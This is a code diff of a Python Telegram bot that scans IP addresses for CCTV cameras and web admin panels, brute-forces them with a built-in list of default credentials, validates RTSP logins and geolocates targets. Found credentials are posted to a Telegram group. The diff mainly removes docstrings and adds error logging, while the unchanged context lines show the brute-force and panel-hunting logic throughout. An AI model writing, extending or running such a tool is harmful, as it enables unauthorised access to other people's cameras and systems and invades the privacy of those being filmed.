@@ -29,7 +29,7 @@ logger = logging.getLogger(__name__)
 IP, PORT, VULN_INPUT, VULN_PORT = range(4)
 
 # Main admin ID
-MAIN_ADMIN_ID = 6972264549  # Your ID
+MAIN_ADMIN_ID = 6972264549
 
 # Common CCTV credentials
 CREDENTIALS = [
@@ -105,7 +105,6 @@ GROUP_CHAT_ID = os.getenv("GROUP_CHAT_ID", "-1002522049841")
 KEEP_ALIVE_PORT = int(os.getenv("KEEP_ALIVE_PORT", 8080))
 
 def is_valid_ipv4(ip: str) -> bool:
-    """Validate an IPv4 address."""
     try:
         parts = ip.split(".")
         if len(parts) != 4:
@@ -121,7 +120,6 @@ def is_valid_ipv4(ip: str) -> bool:
         return False
 
 def is_authorized_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
-    """Check if the user is authorized."""
     user_id = update.effective_user.id
     if user_id == MAIN_ADMIN_ID:
         return True
@@ -129,7 +127,6 @@ def is_authorized_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bo
     return user_id in authorized_users
 
 async def add_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Add a user to the authorized list (admin only)."""
     if update.effective_user.id != MAIN_ADMIN_ID:
         await update.message.reply_text("❌ Only admin can use /add.")
         return
@@ -149,7 +146,6 @@ async def add_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         await update.message.reply_text("Invalid user ID. Use a numeric ID.", reply_markup=main_menu_markup())
 
 async def remove_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Remove a user from the authorized list (admin only)."""
     if update.effective_user.id != MAIN_ADMIN_ID:
         await update.message.reply_text("❌ Only admin can use /remove.")
         return
@@ -170,7 +166,6 @@ async def remove_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> Non
         await update.message.reply_text("Invalid user ID. Use a numeric ID.", reply_markup=main_menu_markup())
 
 async def reboot(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Reboot the bot (admin only)."""
     if update.effective_user.id != MAIN_ADMIN_ID:
         await update.message.reply_text("❌ Only admin can use /reboot.")
         return
@@ -191,7 +186,6 @@ async def reboot(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         await update.message.reply_text(f"❌ Reboot failed: {str(e)}", reply_markup=main_menu_markup())
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Start the conversation with inline buttons for authorized users."""
     if not is_authorized_user(update, context):
         await update.message.reply_text("Contact admin to access the bot.")
         return ConversationHandler.END
@@ -211,7 +205,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     return IP
 
 async def hack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Provide advanced hack options for authorized users."""
     if not is_authorized_user(update, context):
         await update.message.reply_text("Contact admin to access the bot.")
         return
@@ -228,7 +221,6 @@ async def hack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     )
 
 async def start_hack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Handle Standard Scan."""
     if not is_authorized_user(update, context):
         await update.callback_query.message.reply_text("Contact admin to access the bot.")
         await update.callback_query.answer()
@@ -240,7 +232,6 @@ async def start_hack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE
     return IP
 
 async def special_scan_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Handle Special Admin Scan."""
     if not is_authorized_user(update, context):
         await update.callback_query.message.reply_text("Contact admin to access the bot.")
         await update.callback_query.answer()
@@ -252,7 +243,6 @@ async def special_scan_callback(update: Update, context: ContextTypes.DEFAULT_TY
     return IP
 
 async def brute_force_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Handle Brute-Force."""
     if not is_authorized_user(update, context):
         await update.callback_query.message.reply_text("Contact admin to access the bot.")
         await update.callback_query.answer()
@@ -264,7 +254,6 @@ async def brute_force_callback(update: Update, context: ContextTypes.DEFAULT_TYP
     return IP
 
 async def vuln_scan_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Handle Vulnerability Scan from inline button."""
     if not is_authorized_user(update, context):
         await update.callback_query.message.reply_text("Contact admin to access the bot.")
         await update.callback_query.answer()
@@ -281,7 +270,6 @@ async def vuln_scan_callback(update: Update, context: ContextTypes.DEFAULT_TYPE)
     return VULN_INPUT
 
 async def check_link_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Handle Check Link from inline button."""
     if not is_authorized_user(update, context):
         await update.callback_query.message.reply_text("Contact admin to access the bot.")
         await update.callback_query.answer()
@@ -292,7 +280,6 @@ async def check_link_callback(update: Update, context: ContextTypes.DEFAULT_TYPE
     context.user_data["awaiting_checklink"] = True
 
 async def status_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Handle Status from inline button."""
     if not is_authorized_user(update, context):
         await update.callback_query.message.reply_text("Contact admin to access the bot.")
         await update.callback_query.answer()
@@ -303,7 +290,6 @@ async def status_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
     await status(update, context, query.message)
 
 async def main_menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Return to main menu."""
     if not is_authorized_user(update, context):
         await update.callback_query.message.reply_text("Contact admin to access the bot.")
         await update.callback_query.answer()
@@ -325,7 +311,6 @@ async def main_menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE)
     return IP
 
 async def help_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Handle Help."""
     if not is_authorized_user(update, context):
         await update.callback_query.message.reply_text("Contact admin to access the bot.")
         await update.callback_query.answer()
@@ -346,7 +331,6 @@ async def help_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
     )
 
 async def check_link(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Check if a URL is an admin panel and prompt for brute-force."""
     if not is_authorized_user(update, context):
         await update.message.reply_text("Contact admin to access the bot.")
         return
@@ -361,7 +345,6 @@ async def check_link(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None
     context.user_data["awaiting_checklink"] = False
     logger.debug(f"Check Link input: {input_text}")
 
-    # Validate URL
     if not input_text.startswith(("http://", "https://")):
         await update.message.reply_text(
             "Invalid input! Enter a URL starting with http:// or https:// (e.g., http://86.103.65.158:8443/login).",
@@ -372,7 +355,6 @@ async def check_link(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None
     parsed_url = urlparse(input_text)
     logger.debug(f"Parsed URL: scheme={parsed_url.scheme}, netloc={parsed_url.netloc}, hostname={parsed_url.hostname}, port={parsed_url.port}, path={parsed_url.path}")
 
-    # Extract IP
     if not parsed_url.hostname:
         netloc = parsed_url.netloc.split(":")[0]
         if is_valid_ipv4(netloc):
@@ -415,12 +397,10 @@ async def check_link(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None
         panel_name = path.strip("/") or "root"
 
         if is_admin:
-            # Store URL for brute-force
             admin_id = f"a{len(context.user_data.get('admin_urls', {})) + 1}"
             context.user_data.setdefault("admin_urls", {})[admin_id] = url
             context.user_data.setdefault("admin_pages", []).append(url)
 
-            # Notify user and ask for brute-force
             keyboard = [
                 [InlineKeyboardButton("Start Brute-Force?", callback_data=f"hunt_{ip}_{port}_{admin_id}")],
                 [InlineKeyboardButton("Main Menu", callback_data="main_menu")]
@@ -441,7 +421,6 @@ async def check_link(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None
             except Exception as e:
                 logger.error(f"Group send error: {e}")
         else:
-            # No admin panel, no brute-force option
             keyboard = [
                 [InlineKeyboardButton("Visit Page", url=url)],
                 [InlineKeyboardButton("Main Menu", callback_data="main_menu")]
@@ -460,7 +439,6 @@ async def check_link(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None
         )
 
 async def vuln_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Handle URL or IP input for vuln scan."""
     if not is_authorized_user(update, context):
         await update.message.reply_text("Contact admin to access the bot.")
         return ConversationHandler.END
@@ -506,7 +484,6 @@ async def vuln_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
         return VULN_INPUT
 
 async def vuln_port(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Process port and perform vuln scan."""
     if not is_authorized_user(update, context):
         await update.message.reply_text("Contact admin to access the bot.")
         return ConversationHandler.END
@@ -565,7 +542,6 @@ async def vuln_port(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     return ConversationHandler.END
 
 async def vuln_scan(update: Update, context: ContextTypes.DEFAULT_TYPE, message=None) -> None:
-    """Scan admin panels for vulnerabilities."""
     if not is_authorized_user(update, context):
         await update.message.reply_text("Contact admin to access the bot.")
         return
@@ -646,7 +622,6 @@ async def vuln_scan(update: Update, context: ContextTypes.DEFAULT_TYPE, message=
     logger.debug("Vuln scan completed")
 
 async def get_geo(ip: str, context: ContextTypes.DEFAULT_TYPE) -> str:
-    """Fetch geolocation for an IP, with caching."""
     if not hasattr(context.user_data, "geo_cache"):
         context.user_data["geo_cache"] = {}
     if ip in context.user_data["geo_cache"]:
@@ -665,7 +640,6 @@ async def get_geo(ip: str, context: ContextTypes.DEFAULT_TYPE) -> str:
         return "Unknown"
 
 async def check_admin_panel(url: str) -> tuple[bool, list]:
-    """Check if a URL is an admin panel."""
     details = []
     try:
         async with ClientSession(timeout=ClientTimeout(total=5)) as session:
@@ -696,7 +670,6 @@ async def check_admin_panel(url: str) -> tuple[bool, list]:
         return False, [f"Error: {str(e)}"]
 
 async def ip(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Store IP and ask for port."""
     if not is_authorized_user(update, context):
         await update.message.reply_text("Contact admin to access the bot.")
         return ConversationHandler.END
@@ -710,7 +683,6 @@ async def ip(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     return PORT
 
 async def port(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Process IP and port, perform scan."""
     if not is_authorized_user(update, context):
         await update.message.reply_text("Contact admin to access the bot.")
         return ConversationHandler.END
@@ -820,7 +792,6 @@ async def port(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     return ConversationHandler.END
 
 async def hack_cctv(ip: str, port: int, scan_type: str, geo_text: str) -> tuple[str, list, list]:
-    """Perform CCTV scan based on scan_type."""
     results = [f"📡 Scanning {ip}:{port} ({scan_type})..."]
     if geo_text:
         results.append(geo_text)
@@ -898,8 +869,8 @@ async def hack_cctv(ip: str, port: int, scan_type: str, geo_text: str) -> tuple[
                                     if any(keyword in html.lower() for keyword in ["dashboard", "admin"]):
                                         admin_pages.append(url)
                                         results.append(f"🎯 Found Admin: {url} ({username}:{password})")
-                        except Exception:
-                            pass
+                        except Exception as e:
+                            logger.error(f"Brute force error for {url}: {e}")
 
         results.append("⚠️ Use ethically and legally.")
 
@@ -910,7 +881,6 @@ async def hack_cctv(ip: str, port: int, scan_type: str, geo_text: str) -> tuple[
     return "\n".join(results), potential_links, admin_pages
 
 async def hunt_password(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Brute-force credentials, stop after first match with live updates."""
     if not is_authorized_user(update, context):
         await update.callback_query.message.reply_text("Contact admin to access the bot.")
         await update.callback_query.answer()
@@ -962,8 +932,9 @@ async def hunt_password(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
                             if any(keyword in html.lower() for keyword in ["dashboard", "admin"]):
                                 return True
                         return False
-                    except Exception:
-                        return False
+            except Exception as e:
+                logger.error(f"Brute force error for {url}: {e}")
+                return False
 
     found = False
     found_credentials = None
@@ -1032,7 +1003,6 @@ async def hunt_password(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
     context.user_data["brute_force_running"] = False
 
 async def stop_brute_force(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Stop brute-force."""
     if not is_authorized_user(update, context):
         await update.callback_query.message.reply_text("Contact admin to access the bot.")
         await update.callback_query.answer()
@@ -1043,7 +1013,6 @@ async def stop_brute_force(update: Update, context: ContextTypes.DEFAULT_TYPE) -
     await query.message.reply_text("🛑 Brute-force stopped.", reply_markup=main_menu_markup())
 
 async def check_port(ip: str, port: int) -> bool:
-    """Check if port is open."""
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.settimeout(2)
@@ -1055,7 +1024,6 @@ async def check_port(ip: str, port: int) -> bool:
         return False
 
 async def validate_rtsp(ip: str, port: int, username: str, password: str) -> tuple[bool, str]:
-    """Validate RTSP credentials."""
     try:
         reader, writer = await asyncio.open_connection(ip, port)
         request = f"DESCRIBE rtsp://{ip}:{port}/live RTSP/1.0\r\nCSeq: 1\r\n"
@@ -1075,7 +1043,6 @@ async def validate_rtsp(ip: str, port: int, username: str, password: str) -> tup
         return False, str(e)
 
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Cancel conversation."""
     if not is_authorized_user(update, context):
         await update.message.reply_text("Contact admin to access the bot.")
         return ConversationHandler.END
@@ -1084,7 +1051,6 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     return ConversationHandler.END
 
 async def status(update: Update, context: ContextTypes.DEFAULT_TYPE, message=None) -> None:
-    """Check bot status."""
     if not is_authorized_user(update, context):
         await update.message.reply_text("Contact admin to access the bot.")
         return
@@ -1096,7 +1062,6 @@ async def status(update: Update, context: ContextTypes.DEFAULT_TYPE, message=Non
         await update.message.reply_text(reply_text, reply_markup=main_menu_markup())
 
 def main_menu_markup():
-    """Generate main menu inline buttons."""
     return InlineKeyboardMarkup([
         [InlineKeyboardButton("Hack", callback_data="start_hack")],
         [InlineKeyboardButton("Vuln Scan", callback_data="vuln_scan")],
@@ -1106,7 +1071,6 @@ def main_menu_markup():
     ])
 
 async def keep_alive():
-    """Keep-alive server for Koyeb."""
     import http.server
     import socketserver
     class Handler(http.server.SimpleHTTPRequestHandler):
@@ -1124,12 +1088,10 @@ async def keep_alive():
     server.serve_forever()
 
 def run_keep_alive(loop):
-    """Run keep_alive in a separate event loop."""
     asyncio.set_event_loop(loop)
     loop.run_until_complete(keep_alive())
 
 def main() -> None:
-    """Run the bot."""
     application = Application.builder().token(TOKEN).build()
 
     conv_handler = ConversationHandler(
